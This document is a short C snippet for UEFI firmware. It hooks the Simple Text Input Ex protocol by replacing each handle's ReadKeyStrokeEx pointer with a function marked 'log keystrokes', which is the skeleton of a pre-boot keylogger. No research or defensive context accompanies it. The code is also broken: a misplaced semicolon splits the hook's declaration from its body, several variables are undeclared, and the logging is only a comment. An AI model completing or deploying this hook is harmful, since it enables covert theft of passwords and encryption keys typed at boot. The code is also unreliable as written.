#include <Uefi.h>
#include <Protocol/SimpleTextInEx.h>

EFI_INPUT_READ_KEY_EX gOriginalReadKeyStrokeEx;

EFI_STATUS EFIAPI ReadKeyStrokeExHook(IN EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL *This,
                                      OUT EFI_KEY_DATA *KeyData);
{
    gOriginalReadKeyStrokeEx(This, KeyData);

    // log keystrokes
}

VOID HookSimpleTextInEx()
{
    gBS->LocateHandleBuffer(ByProtocol, &gEfiSimpleTextInputExProtocolGuid,
                            NULL, &HandleCount, Handles);
    for (UINTN i = 0; i < HandleCount; ++i)
    {
        EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL *SimpleTextInEx;
        status = gBS->HandleProtocol(Handles[i],
                                     &gEfiSimpleTextInputExProtocolGuid,
                                     (VOID **)&SimpleTextInEx);

        gOriginalReadKeyStrokeEx = SimpleTextInEx->ReadKeyStrokeEx;

        SimpleTextInEx->ReadKeyStrokeEx = ReadKeyStrokeExHook;
    }
}